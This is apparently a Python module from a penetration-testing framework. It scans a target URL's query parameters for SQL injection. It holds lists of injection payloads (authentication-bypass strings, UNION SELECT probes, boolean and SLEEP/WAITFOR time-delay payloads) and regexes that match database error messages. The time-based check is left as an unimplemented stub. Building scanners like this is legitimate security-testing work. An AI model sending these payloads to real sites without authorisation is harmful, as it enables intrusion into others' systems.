"""SQL Injection Scanner Module.

Automated SQL injection vulnerability detection with multiple techniques.
"""

import asyncio
import aiohttp
from typing import Any, Dict, List, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import re

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)


# SQL injection payloads by technique
SQL_PAYLOADS = {
    "error_based": [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR '1'='1'--",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "') UNION SELECT NULL--",
        "UNION SELECT NULL--",
    ],
    "boolean_based": [
        "' AND '1'='1",
        "' AND '1'='2",
        "' AND 1=1--",
        "' AND 1=2--",
        "AND 1=1",
        "AND 1=2",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "' AND SLEEP(5)--",
        "'; SELECT SLEEP(5)--",
    ],
}

# Error patterns that indicate SQL injection
ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"Warning.*pg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.* SQL[\-\_\ ]*Server",
    r"OLE DB.* SQL Server",
    r"SQLServer JDBC Driver",
    r"SqlClient\.",
    r"Microsoft SQL Native Client error",
    r"Oracle error",
    r"Oracle.*Driver",
    r"Warning.*oci_.*",
    r"Warning.*ora_.*",
]


class SqlInjectionScannerModule(AtsModule):
    """Automated SQL injection vulnerability scanner."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="sql_injection_scanner",
            category=ModuleCategory.PENTEST,
            description="Automated SQL injection vulnerability detection",
            version="1.0.0",
            parameters=[
                Parameter(
                    name="url",
                    type=ParameterType.URL,
                    description="Target URL to test",
                    required=True,
                ),
                Parameter(
                    name="techniques",
                    type=ParameterType.CHOICE,
                    description="Injection techniques to use",
                    required=False,
                    default="all",
                    choices=["all", "error_based", "union_based", "boolean_based", "time_based"],
                ),
                Parameter(
                    name="parameters",
                    type=ParameterType.STRING,
                    description="Specific parameters to test (comma-separated, optional)",
                    required=False,
                ),
            ],
            outputs=[
                OutputField(name="vulnerabilities", type="list", description="Found SQL injection vulnerabilities"),
                OutputField(name="summary", type="dict", description="Scan summary"),
            ],
            tags=["sql", "injection", "pentest", "web"],
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        url = config.get("url", "")
        if not url.startswith(("http://", "https://")):
            return False, "URL must start with http:// or https://"
        return True, ""

    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        # Flatten to single values
        return {k: v[0] if v else "" for k, v in params.items()}

    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """Build URL from base and parameters."""
        parsed = urlparse(base_url)
        query = urlencode(params)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment
        ))

    def _detect_sql_error(self, response_text: str) -> List[str]:
        """Detect SQL errors in response."""
        errors = []
        for pattern in ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                errors.append(pattern)
        return errors

    async def _test_payload(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        param_value: str,
        payload: str,
        technique: str
    ) -> Dict[str, Any]:
        """Test a single SQL injection payload."""
        # Inject payload
        params = self._extract_parameters(url)
        params[param_name] = payload

        test_url = self._build_url(url, params)

        try:
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True
            ) as response:
                response_text = await response.text()

                # Detect SQL errors
                errors = self._detect_sql_error(response_text)

                if errors:
                    return {
                        "vulnerable": True,
                        "technique": technique,
                        "payload": payload,
                        "parameter": param_name,
                        "url": test_url,
                        "evidence": errors,
                        "status_code": response.status,
                    }

                # For time-based, check response time
                if technique == "time_based":
                    # Would need to measure time, but simplified here
                    pass

        except Exception as e:
            self.logger.debug(f"Test failed: {e}")

        return {"vulnerable": False}

    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        param_value: str,
        techniques: List[str]
    ) -> List[Dict[str, Any]]:
        """Test all payloads on a single parameter."""
        vulnerabilities = []

        for technique in techniques:
            payloads = SQL_PAYLOADS.get(technique, [])

            for payload in payloads:
                result = await self._test_payload(
                    session, url, param_name, param_value, payload, technique
                )

                if result.get("vulnerable"):
                    vulnerabilities.append(result)
                    self.logger.warning(
                        "sqli_found",
                        param=param_name,
                        technique=technique,
                        payload=payload[:50]
                    )
                    # Stop testing this parameter after first vuln
                    break

            # If found with this technique, no need to test others
            if vulnerabilities:
                break

        return vulnerabilities

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        url = config["url"]
        techniques_selection = config.get("techniques", "all")
        specific_params = config.get("parameters", "").strip()

        self.logger.info("starting_sqli_scan", url=url)

        # Determine techniques
        if techniques_selection == "all":
            techniques = list(SQL_PAYLOADS.keys())
        else:
            techniques = [techniques_selection]

        # Get parameters to test
        all_params = self._extract_parameters(url)

        if not all_params:
            return {
                "vulnerabilities": [],
                "summary": {
                    "status": "error",
                    "message": "No query parameters found in URL"
                }
            }

        # Filter parameters if specified
        if specific_params:
            specific_list = [p.strip() for p in specific_params.split(",")]
            params_to_test = {k: v for k, v in all_params.items() if k in specific_list}
        else:
            params_to_test = all_params

        # Test each parameter
        all_vulnerabilities = []

        async with aiohttp.ClientSession() as session:
            for param_name, param_value in params_to_test.items():
                self.logger.info("testing_parameter", param=param_name)

                vulns = await self._test_parameter(
                    session, url, param_name, param_value, techniques
                )

                all_vulnerabilities.extend(vulns)

        # Build summary
        summary = {
            "url": url,
            "parameters_tested": len(params_to_test),
            "vulnerabilities_found": len(all_vulnerabilities),
            "vulnerable_parameters": list(set(v["parameter"] for v in all_vulnerabilities)),
            "techniques_detected": list(set(v["technique"] for v in all_vulnerabilities)),
            "risk_level": "HIGH" if all_vulnerabilities else "NONE",
        }

        self.logger.info(
            "sqli_scan_complete",
            url=url,
            vulns_found=len(all_vulnerabilities)
        )

        return {
            "vulnerabilities": all_vulnerabilities,
            "summary": summary,
            "tested_parameters": list(params_to_test.keys()),
            "techniques_used": techniques,
        }
